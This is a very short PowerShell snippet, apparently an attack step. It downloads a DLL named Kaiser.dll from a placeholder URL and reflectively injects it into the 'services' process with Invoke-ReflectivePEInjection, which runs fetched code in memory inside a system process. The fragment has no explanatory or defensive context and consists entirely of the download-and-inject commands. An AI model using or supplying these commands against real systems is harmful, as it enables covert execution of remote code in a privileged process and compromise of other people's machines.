;
$PEBytes = (New-Object Net.WebClient).DownloadData("<URL to Kaiser.dll>");
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcName services
